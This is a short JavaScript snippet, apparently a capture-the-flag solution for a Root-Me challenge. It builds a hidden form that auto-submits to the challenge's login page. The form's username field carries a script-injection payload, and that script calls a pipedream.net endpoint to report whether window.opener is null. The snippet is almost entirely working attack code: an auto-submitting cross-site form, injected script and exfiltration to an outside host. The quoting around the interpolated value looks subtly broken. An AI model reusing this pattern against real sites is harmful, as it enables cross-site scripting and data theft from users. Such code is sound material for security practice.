let url = "http://challenge01.root-me.org:58003/login"

let nullOpener = window.opener == null ? "yes":"non"
let payload={
    username :`<script>window.open("https://eozr3kmrbmb1rnm.m.pipedream.net?openerIsNull="${nullOpener})</script>`,
    secret: "aa",
}
const form = document.createElement('form');
form.method = 'POST';
form.action = url;
form.style.visibility = 'hidden'; 
for (const key of Object.keys(payload)) {
    var input = document.createElement('input');
    input.name = key;
    input.value = payload[key];
    form.appendChild(input); // add key/value pair to form
  }
  document.body.appendChild(form); // forms cannot be submitted outside of body
  form.submit(); 

